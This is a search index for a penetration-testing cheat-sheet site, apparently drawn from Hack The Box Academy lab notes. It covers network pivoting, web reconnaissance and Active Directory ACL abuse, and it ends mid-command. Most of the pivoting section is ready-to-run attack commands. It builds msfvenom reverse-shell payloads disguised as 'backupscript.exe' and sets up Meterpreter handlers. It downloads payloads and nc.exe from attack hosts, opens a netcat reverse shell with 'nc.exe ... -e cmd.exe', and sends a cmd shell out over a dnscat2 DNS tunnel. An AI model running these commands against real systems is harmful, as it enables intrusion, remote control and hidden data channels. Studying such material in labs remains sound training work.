{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":"<pre>\n\n\n       \u2588\u2588\u2591 \u2588\u2588  \u2584\u2584\u2584       \u2584\u2588\u2588\u2588\u2588\u2584   \u2588\u2588 \u2584\u2588\u2580 \u2588\u2588\u2593 \u2588\u2588\u2588\u2584    \u2588   \u2584\u2588\u2588\u2588\u2588                  \n      \u2593\u2588\u2588\u2591 \u2588\u2588\u2592\u2592\u2588\u2588\u2588\u2588\u2584    \u2592\u2588\u2588\u2580 \u2580\u2588   \u2588\u2588\u2584\u2588\u2592 \u2593\u2588\u2588\u2592 \u2588\u2588 \u2580\u2588   \u2588  \u2588\u2588\u2592 \u2580\u2588\u2592                 \n      \u2592\u2588\u2588\u2580\u2580\u2588\u2588\u2591\u2592\u2588\u2588  \u2580\u2588\u2584  \u2592\u2593\u2588    \u2584 \u2593\u2588\u2588\u2588\u2584\u2591 \u2592\u2588\u2588\u2592\u2593\u2588\u2588  \u2580\u2588 \u2588\u2588\u2592\u2592\u2588\u2588\u2591\u2584\u2584\u2584\u2591                 \n      \u2591\u2593\u2588 \u2591\u2588\u2588 \u2591\u2588\u2588\u2584\u2584\u2584\u2584\u2588\u2588 \u2592\u2593\u2593\u2584 \u2584\u2588\u2588\u2592\u2593\u2588\u2588 \u2588\u2584 \u2591\u2588\u2588\u2591\u2593\u2588\u2588\u2592  \u2590\u258c\u2588\u2588\u2592\u2591\u2593\u2588  \u2588\u2588\u2593                 \n      \u2591\u2593\u2588\u2592\u2591\u2588\u2588\u2593 \u2593\u2588   \u2593\u2588\u2588\u2592\u2592 \u2593\u2588\u2588\u2588\u2580 \u2591\u2592\u2588\u2588\u2592 \u2588\u2584\u2591\u2588\u2588\u2591\u2592\u2588\u2588\u2591   \u2593\u2588\u2588\u2591\u2591\u2592\u2593\u2588\u2588\u2588\u2580\u2592                 \n       \u2592 \u2591\u2591\u2592\u2591\u2592 \u2592\u2592   \u2593\u2592\u2588\u2591\u2591 \u2591\u2592 \u2592  \u2591\u2592 \u2592\u2592 \u2593\u2592\u2591\u2593  \u2591 \u2592\u2591   \u2592 \u2592  \u2591\u2592   \u2592                  \n       \u2592 \u2591\u2592\u2591 \u2591  \u2592   \u2592\u2592 \u2591  \u2591  \u2592   \u2591 \u2591\u2592 \u2592\u2591 \u2592 \u2591\u2591 \u2591\u2591   \u2591 \u2592\u2591  \u2591   \u2591                  \n       \u2591  \u2591\u2591 \u2591  \u2591   \u2592   \u2591        \u2591 \u2591\u2591 \u2591  \u2592 \u2591   \u2591   \u2591 \u2591 \u2591 \u2591   \u2591                  \n       \u2591  \u2591  \u2591      \u2591  \u2591\u2591 \u2591      \u2591  \u2591    \u2591           \u2591       \u2591                  \n                        \u2591                                                       \n       \u2584\u2584\u2584       \u2588     \u2588\u2591\u2593\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588  \u2592\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2584 \u2584\u2588\u2588\u2588\u2593\u2593\u2588\u2588\u2588\u2588\u2588             \n      \u2592\u2588\u2588\u2588\u2588\u2584    \u2593\u2588\u2591 \u2588 \u2591\u2588\u2591\u2593\u2588   \u2580 \u2592\u2588\u2588    \u2592 \u2592\u2588\u2588\u2592  \u2588\u2588\u2592\u2593\u2588\u2588\u2592\u2580\u2588\u2580 \u2588\u2588\u2592\u2593\u2588   \u2580             \n      \u2592\u2588\u2588  \u2580\u2588\u2584  \u2592\u2588\u2591 \u2588 \u2591\u2588 \u2592\u2588\u2588\u2588   \u2591 \u2593\u2588\u2588\u2584   \u2592\u2588\u2588\u2591  \u2588\u2588\u2592\u2593\u2588\u2588    \u2593\u2588\u2588\u2591\u2592\u2588\u2588\u2588               \n      \u2591\u2588\u2588\u2584\u2584\u2584\u2584\u2588\u2588 \u2591\u2588\u2591 \u2588 \u2591\u2588 \u2592\u2593\u2588  \u2584   \u2592   \u2588\u2588\u2592\u2592\u2588\u2588   \u2588\u2588\u2591\u2592\u2588\u2588    \u2592\u2588\u2588 \u2592\u2593\u2588  \u2584             \n       \u2593\u2588   \u2593\u2588\u2588\u2592\u2591\u2591\u2588\u2588\u2592\u2588\u2588\u2593 \u2591\u2592\u2588\u2588\u2588\u2588\u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2591 \u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2592\u2588\u2588\u2592   \u2591\u2588\u2588\u2592\u2591\u2592\u2588\u2588\u2588\u2588\u2592            \n       \u2592\u2592   \u2593\u2592\u2588\u2591\u2591 \u2593\u2591\u2592 \u2592  \u2591\u2591 \u2592\u2591 \u2591\u2592 \u2592\u2593\u2592 \u2592 \u2591\u2591 \u2592\u2591\u2592\u2591\u2592\u2591 \u2591 \u2592\u2591   \u2591  \u2591\u2591\u2591 \u2592\u2591 \u2591            \n        \u2592   \u2592\u2592 \u2591  \u2592 \u2591 \u2591   \u2591 \u2591  \u2591\u2591 \u2591\u2592  \u2591 \u2591  \u2591 \u2592 \u2592\u2591 \u2591  \u2591      \u2591 \u2591 \u2591  \u2591            \n        \u2591   \u2592     \u2591   \u2591     \u2591   \u2591  \u2591  \u2591  \u2591 \u2591 \u2591 \u2592  \u2591      \u2591      \u2591               \n            \u2591  \u2591    \u2591       \u2591  \u2591      \u2591      \u2591 \u2591         \u2591      \u2591  \u2591            \n\n \u2584\u2588\u2588\u2588\u2588\u2584   \u2588\u2588\u2591 \u2588\u2588 \u2593\u2588\u2588\u2588\u2588\u2588 \u2584\u2584\u2584     \u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2593  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2591 \u2588\u2588 \u2593\u2588\u2588\u2588\u2588\u2588 \u2593\u2588\u2588\u2588\u2588\u2588\u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2593\n\u2592\u2588\u2588\u2580 \u2580\u2588  \u2593\u2588\u2588\u2591 \u2588\u2588\u2592\u2593\u2588   \u2580\u2592\u2588\u2588\u2588\u2588\u2584   \u2593  \u2588\u2588\u2592 \u2593\u2592\u2592\u2588\u2588    \u2592 \u2593\u2588\u2588\u2591 \u2588\u2588\u2592\u2593\u2588   \u2580 \u2593\u2588   \u2580\u2593  \u2588\u2588\u2592 \u2593\u2592\n\u2592\u2593\u2588    \u2584 \u2592\u2588\u2588\u2580\u2580\u2588\u2588\u2591\u2592\u2588\u2588\u2588  \u2592\u2588\u2588  \u2580\u2588\u2584 \u2592 \u2593\u2588\u2588\u2591 \u2592\u2591\u2591 \u2593\u2588\u2588\u2584   \u2592\u2588\u2588\u2580\u2580\u2588\u2588\u2591\u2592\u2588\u2588\u2588   \u2592\u2588\u2588\u2588  \u2592 \u2593\u2588\u2588\u2591 \u2592\u2591\n\u2592\u2593\u2593\u2584 \u2584\u2588\u2588\u2592\u2591\u2593\u2588 \u2591\u2588\u2588 \u2592\u2593\u2588  \u2584\u2591\u2588\u2588\u2584\u2584\u2584\u2584\u2588\u2588\u2591 \u2593\u2588\u2588\u2593 \u2591   \u2592   \u2588\u2588\u2592\u2591\u2593\u2588 \u2591\u2588\u2588 \u2592\u2593\u2588  \u2584 \u2592\u2593\u2588  \u2584\u2591 \u2593\u2588\u2588\u2593 \u2591 \n\u2592 \u2593\u2588\u2588\u2588\u2580 \u2591\u2591\u2593\u2588\u2592\u2591\u2588\u2588\u2593\u2591\u2592\u2588\u2588\u2588\u2588\u2592\u2593\u2588   \u2593\u2588\u2588\u2592 \u2592\u2588\u2588\u2592 \u2591 \u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2591\u2593\u2588\u2592\u2591\u2588\u2588\u2593\u2591\u2592\u2588\u2588\u2588\u2588\u2592\u2591\u2592\u2588\u2588\u2588\u2588\u2592 \u2592\u2588\u2588\u2592 \u2591 \n\u2591 \u2591\u2592 \u2592  \u2591 \u2592 \u2591\u2591\u2592\u2591\u2592\u2591\u2591 \u2592\u2591 \u2591\u2592\u2592   \u2593\u2592\u2588\u2591 \u2592 \u2591\u2591   \u2592 \u2592\u2593\u2592 \u2592 \u2591 \u2592 \u2591\u2591\u2592\u2591\u2592\u2591\u2591 \u2592\u2591 \u2591\u2591\u2591 \u2592\u2591 \u2591 \u2592 \u2591\u2591   \n  \u2591  \u2592    \u2592 \u2591\u2592\u2591 \u2591 \u2591 \u2591  \u2591 \u2592   \u2592\u2592 \u2591   \u2591    \u2591 \u2591\u2592  \u2591 \u2591 \u2592 \u2591\u2592\u2591 \u2591 \u2591 \u2591  \u2591 \u2591 \u2591  \u2591   \u2591    \n\u2591         \u2591  \u2591\u2591 \u2591   \u2591    \u2591   \u2592    \u2591      \u2591  \u2591  \u2591   \u2591  \u2591\u2591 \u2591   \u2591      \u2591    \u2591      \n\u2591 \u2591       \u2591  \u2591  \u2591   \u2591  \u2591     \u2591  \u2591              \u2591   \u2591  \u2591  \u2591   \u2591  \u2591   \u2591  \u2591        \n\u2591                                                                               \n\n\n</pre>"},{"location":"pivoting/","title":"Pivoting","text":""},{"location":"pivoting/#dynamic-port-forwarding-with-ssh-and-socks-tunneling","title":"Dynamic Port Forwarding with SSH and SOCKS Tunneling","text":"<ol> <li>Scanning the Pivot Target: <code>nmap -sT -p22,3306 10.129.202.64</code></li> <li>Executing the Local Port Forward: <code>ssh -L 1234:localhost:3306 ubuntu@10.129.202.64</code></li> <li>Confirming Port Forward with Netstat: <code>netstat -antp | grep 1234</code></li> <li>Confirming Port Forward with Nmap: <code>nmap -v -sV -p1234 localhost</code></li> <li>Forwarding Multiple Ports: <code>ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64</code></li> </ol>"},{"location":"pivoting/#setting-up-to-pivot","title":"Setting up to Pivot","text":"<ol> <li>Enabling Dynamic Port Forwarding with SSH: <code>ssh -D 9050 ubuntu@10.129.202.64</code></li> <li>Checking /etc/proxychains.conf: <code>tail -4 /etc/proxychains.conf</code></li> <li>Using Nmap with Proxychains: <code>proxychains nmap -v -sn 172.16.5.1-200</code></li> <li>Enumerating the Windows Target through Proxychains: <code>proxychains nmap -v -Pn -sT 172.16.5.19</code></li> <li>Using Metasploit with Proxychains: <ol> <li><code>proxychains msfconsole</code></li> <li><code>search rdp_scanner</code></li> <li><code>set rhosts</code></li> </ol> </li> <li>Using xfreerdp with Proxychains: <code>proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123</code></li> </ol>"},{"location":"pivoting/#remotereverse-port-forwarding-with-ssh","title":"Remote/Reverse Port Forwarding with SSH","text":"<ol> <li>Creating a Windows Payload with msfvenom: <code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></li> <li>Configuring &amp; Starting the multi/handler: <ol> <li><code>use exploit/multi/handler</code></li> <li><code>set payload windows/x64/meterpreter/reverse_https</code></li> <li><code>set lhost 0.0.0.0</code></li> <li><code>set lport 8000</code></li> </ol> </li> <li>Transferring Payload to Pivot Host: <code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code></li> <li>Starting Python3 Webserver on Pivot Host: <code>python3 -m http.server 8123</code></li> <li>Downloading Payload on the Windows Target: <code>Invoke-WebRequest -Uri \"http://172.16.5.129:8123/backupscript.exe\" -OutFile \"C:\\backupscript.exe\"</code></li> <li>Using SSH -R: <code>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></li> <li>Meterpreter Session Established: <code>shell</code></li> </ol>"},{"location":"pivoting/#meterpreter-tunneling-port-forwarding","title":"Meterpreter Tunneling &amp; Port Forwarding","text":"<ol> <li>Creating Payload for Ubuntu Pivot Host: <code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080</code></li> <li>Configuring &amp; Starting the multi/handler:<ol> <li><code>use exploit/multi/handler</code></li> <li><code>set payload linux/x64/meterpreter/reverse_tcp</code></li> <li><code>set lhost 0.0.0.0</code></li> <li><code>set lport 8000</code></li> </ol> </li> <li>Executing the Payload on the Pivot Host:<ol> <li><code>chmod +x backupjob</code></li> <li><code>./backupjob</code></li> </ol> </li> <li>Meterpreter Session Establishment</li> <li>Ping Sweep: <code>run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code></li> <li>Ping Sweep For Loop on Linux Pivot Hosts: <code>for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep \"bytes from\" &amp;) ;done</code></li> <li>Ping Sweep For Loop Using CMD: <code>for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find \"Reply\"</code></li> <li>Ping Sweep Using PowerShell: <code>1..254 | % {\"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)\"}</code></li> <li>Configuring MSF's SOCKS Proxy: <ol> <li><code>use auxiliary/server/socks_proxy</code></li> <li><code>set SRVPORT 9050</code></li> <li><code>set SRVHOST 0.0.0.0</code></li> <li><code>set version 4a</code></li> <li>Confirming Proxy Server is Running: <code>job</code></li> </ol> </li> <li>Adding a Line to proxychains.conf if Needed: <code>socks4    127.0.0.1 9050</code></li> <li>Creating Routes with AutoRoute:<ol> <li><code>use post/multi/manage/autoroute</code></li> <li><code>set SESSION 1</code></li> <li><code>set SUBNET 172.16.5.0</code></li> <li>It is also possible to add routes with autoroute by running autoroute from the Meterpreter session: <code>run autoroute -s 172.16.5.0/23</code></li> <li>Listing Active Routes with AutoRoute: <code>run autoroute -p</code></li> </ol> </li> <li>Testing Proxy &amp; Routing Functionality: <code>proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn</code></li> </ol>"},{"location":"pivoting/#port-forwarding","title":"Port Forwarding","text":"<ol> <li>Creating Local TCP Relay: <code>portfwd add -l 3300 -p 3389 -r 172.16.5.19</code></li> <li>Connecting to Windows Target through localhost: `</li> <li>Netstat Output: <code>netstat -antp</code></li> <li>Reverse Port Forwarding Rules: <code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 10.10.14.18</code></li> <li>Configuring &amp; Starting multi/handler:<ol> <li><code>bg</code></li> <li><code>set payload windows/x64/meterpreter/reverse_tcp</code></li> <li><code>set LPORT 8081</code></li> <li><code>set LHOST 0.0.0.0</code></li> </ol> </li> <li>Generating the Windows Payload: <code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234</code></li> <li>Execute paylload on Windows host and get a shell with <code>shell</code> command.</li> </ol>"},{"location":"pivoting/#socat-redirection-with-a-reverse-shell","title":"Socat Redirection with a Reverse Shell","text":"<ol> <li>Starting Socat Listener: <code>socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80</code></li> <li>Creating the Windows Payload: <code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080</code></li> <li>Configuring &amp; Starting the multi/handler: <ol> <li><code>use exploit/multi/handler</code></li> <li><code>set payload windows/x64/meterpreter/reverse_https</code></li> <li><code>set lhost 0.0.0.0</code></li> <li><code>set lport 80</code></li> </ol> </li> <li>Test this by running our payload on the windows host again, and we should see a network connection from the Ubuntu server this time.</li> </ol>"},{"location":"pivoting/#socat-redirection-with-a-bind-shell","title":"Socat Redirection with a Bind Shell","text":"<ol> <li>Creating the Windows Payload: <code>msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443</code></li> <li>Starting Socat Bind Shell Listener: <code>socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443</code></li> <li>Configuring &amp; Starting the Bind multi/handler:<ol> <li><code>use exploit/multi/handler</code></li> <li><code>set payload windows/x64/meterpreter/bind_tcp</code></li> <li><code>set RHOST 10.129.202.64</code></li> <li><code>set LPORT 8080</code></li> </ol> </li> <li>We can see a bind handler connected to a stage request pivoted via a socat listener upon executing the payload on a Windows target.</li> </ol>"},{"location":"pivoting/#ssh-for-windows-plinkexe","title":"SSH for Windows: plink.exe","text":"<ol> <li>Using Plink.exe: <code>plink -ssh -D 9050 ubuntu@10.129.15.50</code></li> <li>Proxifier can be used to start a SOCKS tunnel via the SSH. After configuring the SOCKS server for 127.0.0.1 and port 9050, we can directly start mstsc.exe to start an RDP session with a Windows target that allows RDP connections.</li> </ol>"},{"location":"pivoting/#ssh-pivoting-with-sshuttle","title":"SSH Pivoting with Sshuttle","text":"<ol> <li>Running sshuttle: <code>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v</code></li> <li>With this command, sshuttle creates an entry in our iptables to redirect all traffic to the 172.16.5.0/23 network through the pivot host.</li> </ol>"},{"location":"pivoting/#web-server-pivoting-with-rpivot","title":"Web Server Pivoting with Rpivot","text":"<ol> <li>Cloning rpivot: <code>git clone https://github.com/klsecservices/rpivot.git</code></li> <li>Installing Python2.7: <code>sudo apt-get install python2.7</code></li> <li>Alternative Installation of Python2.7:</li> </ol> <pre><code>curl https://pyenv.run | bash\necho 'export PYENV_ROOT=\"$HOME/.pyenv\"' &gt;&gt; ~/.bashrc\necho 'command -v pyenv &gt;/dev/null || export PATH=\"$PYENV_ROOT/bin:$PATH\"' &gt;&gt; ~/.bashrc\necho 'eval \"$(pyenv init -)\"' &gt;&gt; ~/.bashrc\nsource ~/.bashrc\npyenv install 2.7\npyenv shell 2.7\n</code></pre> <ol> <li>Running server.py from the Attack Host: <code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></li> <li>Transfering rpivot to the Target: <code>scp -r rpivot ubuntu@&lt;IpaddressOfTarget&gt;:/home/ubuntu/</code></li> <li>Running client.py from Pivot Target: <code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code></li> <li>We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.</li> <li>Finally, we should be able to access the webserver on our server-side, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox: <code>proxychains firefox-esr 172.16.5.135:80</code></li> <li>Connecting to a Web Server using HTTP-Proxy &amp; NTLM Auth: <code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip &lt;IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></li> </ol>"},{"location":"pivoting/#port-forwarding-with-windows-netsh","title":"Port Forwarding with Windows Netsh","text":"<ol> <li>Using Netsh.exe to Port Forward: <code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25</code></li> <li>Verifying Port Forward: <code>netsh.exe interface portproxy show v4tov4</code></li> </ol>"},{"location":"pivoting/#dns-tunneling-with-dnscat2","title":"DNS Tunneling with Dnscat2","text":"<ol> <li>Cloning dnscat2 and Setting Up the Server: <code>git clone https://github.com/iagox86/dnscat2.git</code></li> <li>Starting the dnscat2 server: <code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></li> <li>Cloning dnscat2-powershell to the Attack Host: <code>git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></li> <li>Importing dnscat2.ps1: <code>Import-Module .\\dnscat2.ps1</code></li> <li>After dnscat2.ps1 is imported, we can use it to establish a tunnel with the server running on our attack host. We can send back a CMD shell session to our server: <code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code></li> <li>Listing dnscat2 Options: <code>?</code></li> <li>Interacting with the Established Session: <ol> <li><code>window -i 1</code></li> </ol> </li> </ol>"},{"location":"pivoting/#socks5-tunneling-with-chisel","title":"SOCKS5 Tunneling with Chisel","text":"<ol> <li>Clone repo: <code>git clone https://github.com/jpillora/chisel.git</code></li> <li><code>cd chisel</code></li> <li><code>go build</code></li> <li>Transferring Chisel Binary to Pivot Host: <code>scp chisel ubuntu@10.129.202.64:~/</code></li> <li>Running the Chisel Server on the Pivot Host: <code>./chisel server -v -p 1234 --socks5</code></li> <li>Connecting to the Chisel Server: <code>./chisel client -v 10.129.202.64:1234 socks</code></li> <li>Chisel client has created a TCP/UDP tunnel via HTTP secured using SSH between the Chisel server and the client and has started listening on port 1080.</li> <li>Editing &amp; Confirming proxychains.conf: <code>socks5 127.0.0.1 1080</code></li> </ol>"},{"location":"pivoting/#chisel-reverse-pivot","title":"Chisel Reverse Pivot","text":"<ol> <li>Install on attack box: <code>curl https://i.jpillora.com/chisel! | bash</code> or clone repo: <code>git clone https://github.com/jpillora/chisel.git</code></li> <li>Edit /etc/proxychains.conf &gt; socks5 127.0.0.1 1080</li> <li>Starting the Chisel Server on our Attack Host: <code>sudo ./chisel server --reverse -v -p 1234 --socks5</code></li> <li>Connecting the Chisel Client to our Attack Host:  <code>../chisel client -v 10.10.14.17:1234 R:socks</code></li> <li>Run command: <code>proxychains4 -q nmap ip-address</code></li> <li>Links:<ol> <li>https://github.com/jpillora/chisel</li> <li>https://ap3x.github.io/posts/pivoting-with-chisel/</li> </ol> </li> </ol>"},{"location":"pivoting/#icmp-tunneling-with-socks","title":"ICMP Tunneling with SOCKS","text":"<ol> <li>Cloning Ptunnel-ng: <code>git clone https://github.com/utoni/ptunnel-ng.git</code></li> <li>Building Ptunnel-ng with Autogen.sh: <code>sudo ./autogen.sh</code></li> <li>Alternative approach of building a static binary:</li> </ol> <pre><code>sudo apt install automake autoconf -y\ncd ptunnel-ng/\nsed -i '$s/.*/LDFLAGS=-static \"${NEW_WD}\\/configure\" --enable-static $@ \\&amp;\\&amp; make clean \\&amp;\\&amp; make -j${BUILDJOBS:-4} all/' autogen.sh\n./autogen.sh\n</code></pre> <ol> <li>Transferring Ptunnel-ng to the Pivot Host: <code>scp -r ptunnel-ng ubuntu@10.129.202.64:~/</code></li> <li>Starting the ptunnel-ng Server on the Target Host: <code>sudo ./ptunnel-ng -r10.129.202.64 -R22</code></li> <li>Connecting to ptunnel-ng Server from Attack Host: <code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code></li> <li>Tunneling an SSH connection through an ICMP Tunnel: <code>ssh -p2222 -lubuntu 127.0.0.1</code></li> <li>Enabling Dynamic Port Forwarding over SSH: <code>ssh -D 9050 -p2222 -lubuntu 127.0.0.1</code></li> <li>Proxychaining through the ICMP Tunnel: <code>proxychains nmap -sV -sT 172.16.5.19 -p3389</code></li> </ol>"},{"location":"pivoting/#rdp-and-socks-tunneling-with-socksoverrdp","title":"RDP and SOCKS Tunneling with SocksOverRDP","text":"<ol> <li>Loading SocksOverRDP.dll using regsvr32.exe: <code>regsvr32.exe SocksOverRDP-Plugin.dll</code></li> <li>Now we can connect to 172.16.5.19 over RDP using mstsc.exe, and we should receive a prompt that the SocksOverRDP plugin is enabled, and it will listen on 127.0.0.1:1080</li> <li>We will need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to 172.16.5.19. We can then start SocksOverRDP-Server.exe with Admin privileges.</li> <li>When we go back to our foothold target and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080</li> <li>Confirming the SOCKS Listener is Started: <code>netstat -antb | findstr 1080</code></li> </ol>"},{"location":"pivoting/#netcat","title":"NETCAT","text":"<ol> <li>Download on windows host: <code>Invoke-WebRequest -Uri [http://10.10.14.144:9999/nc.exe](http://10.10.14.144:9999/nc.exe) -OutFile nc.exe -UseBasicParsing</code></li> <li>Run nc on atack host: <code>nc -nlvp 4444</code></li> <li>Run nc on target: <code>nc.exe 10.10.14.144 4444 -e cmd.exe</code></li> </ol>"},{"location":"pivoting/#netshexe","title":"NETSH.EXE","text":"<ol> <li>Using Netsh.exe to Port Forward <code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25</code></li> <li>Verifying Port Forward <code>netsh.exe interface portproxy show v4tov4</code></li> <li>Connecting to the Internal Host through the Port Forward <code>xfreerdp /v:ip-address:port /u:user /p:password</code></li> </ol>"},{"location":"webinfogathering/","title":"Web Information Gathering","text":""},{"location":"webinfogathering/#whois","title":"Whois","text":"<p><code>whois inlanefreight.com</code></p>"},{"location":"webinfogathering/#dig","title":"Dig","text":"<ol> <li>Performs a default A record lookup for the domain: <code>dig domain.com</code></li> <li>Retrieves the IPv4 address (A record) associated with the domain: <code>dig domain.com A</code></li> <li>Retrieves the IPv6 address (AAAA record) associated with the domain: <code>dig domain.com AAAA</code></li> <li>Finds the mail servers (MX records) responsible for the domain: <code>dig domain.com MX</code></li> <li>Identifies the authoritative name servers for the domain: <code>dig domain.com NS</code></li> <li>Retrieves any TXT records associated with the domain: <code>dig domain.com TXT</code></li> <li>Retrieves the canonical name (CNAME) record for the domain: <code>dig domain.com CNAME</code></li> <li>Retrieves the start of authority (SOA) record for the domain: <code>dig domain.com SOA</code></li> <li>pecifies a specific name server to query; in this case 1.1.1.1: <code>dig @1.1.1.1 domain.com</code></li> <li>Shows the full path of DNS resolution: <code>dig +trace domain.com</code></li> <li>Performs a reverse lookup on the IP address 192.168.1.1 to find the associated host name. You may need to specify a name server: <code>dig -x 192.168.1.1</code></li> <li>Provides a short, concise answer to the query: <code>dig +short domain.com</code></li> <li>Displays only the answer section of the query output: <code>dig +noall +answer domain.com</code></li> <li>Retrieves all available DNS records for the domain (Note: Many DNS servers ignore <code>ANY</code> queries to reduce load and prevent abuse, as per RFC 8482): <code>dig domain.com ANY</code></li> </ol>"},{"location":"webinfogathering/#subdomain-enumeration","title":"Subdomain enumeration","text":""},{"location":"webinfogathering/#dnsenum","title":"Dnsenum","text":"<p><code>dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r</code></p>"},{"location":"webinfogathering/#dns-zone-transfers","title":"DNS Zone Transfers","text":"<p><code>dig axfr @nsztm1.digi.ninja zonetransfer.me</code></p>"},{"location":"webinfogathering/#virtual-hosts","title":"Virtual hosts","text":"<p><code>gobuster vhost -u http://&lt;target_IP_address&gt; -w &lt;wordlist_file&gt; --append-domain</code></p>"},{"location":"webinfogathering/#crtsh","title":"crt.sh","text":"<p><code>curl -s \"[https://crt.sh/?q=facebook.com&amp;output=json](https://crt.sh/?q=facebook.com&amp;output=json)\" | jq -r '.[] | select(.name_value | contains(\"dev\")) | .name_value' | sort -u</code></p>"},{"location":"webinfogathering/#banner-grabbing","title":"Banner grabbing","text":"<p><code>curl -I inlanefreight.com</code></p>"},{"location":"webinfogathering/#waf-detection","title":"WAF detection","text":""},{"location":"webinfogathering/#wafw00f","title":"wafw00f","text":"<ol> <li><code>pip3 install git+https://github.com/EnableSecurity/wafw00f</code></li> <li><code>wafw00f inlanefreight.com</code></li> </ol>"},{"location":"webinfogathering/#crawling","title":"Crawling","text":""},{"location":"webinfogathering/#reconspider","title":"ReconSpider","text":"<ol> <li><code>wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip</code></li> <li><code>unzip ReconSpider.zip</code></li> <li><code>python3 ReconSpider.py http://inlanefreight.com</code> </li> </ol>"},{"location":"webinfogathering/#reconnaissance-frameworks","title":"Reconnaissance Frameworks","text":"<ol> <li>FinalRecon</li> <li>Recon-ng</li> <li>theHarvester</li> <li>SpiderFoot</li> <li>OSINT Framework</li> </ol>"},{"location":"webinfogathering/#finalrecon","title":"FinalRecon","text":"<ol> <li><code>git clone https://github.com/thewhiteh4t/FinalRecon.git</code></li> <li><code>cd FinalRecon</code></li> <li><code>pip3 install -r requirements.txt</code></li> <li><code>chmod +x ./finalrecon.py</code></li> <li><code>./finalrecon.py --help</code></li> <li><code>./finalrecon.py --headers --whois --url http://inlanefreight.com</code></li> </ol>"},{"location":"active-directory/acl/","title":"ACL Abuse Primer","text":""},{"location":"active-directory/acl/#enumerating-acls-with-powerview","title":"Enumerating ACLs with PowerView","text":"<ol> <li>Using Find-InterestingDomainAcl: <code>Find-InterestingDomainAcl</code></li> <li>Using Get-DomainObjectACL: <code>Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}</code></li> <li>Performing a Reverse Search &amp; Mapping to a GUID Value:<ol> <li><code>$guid= \"00299570-246d-11d0-a768-00aa006e0529\"</code></li> <li><code>Get-ADObject -SearchBase \"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl</code></li> </ol> </li> <li>Using the -ResolveGUIDs Flag: <code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $s</code></li> <li>Creating a List of Domain Users: <code>Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code></li> <li>A Useful foreach Loop: <code>foreach($line in [System.IO.File]::ReadLines(\"C:\\Users\\htb-student\\Desktop\\ad_users.txt\")) {get-acl  \"AD:\\$(Get-ADUser $line)\" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\\\wley'}}</code></li> <li>Further Enumeration of Rights Using user-name:<ol> <li><code>$sid2 = Convert-NameToSid damundsen</code></li> <li><code>Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose</code></li> </ol> </li> <li>Investigating the \"Help Desk Level 1\" Group with Get-DomainGroup: <code>Get-DomainGroup -Identity \"Help Desk Level 1\" | select 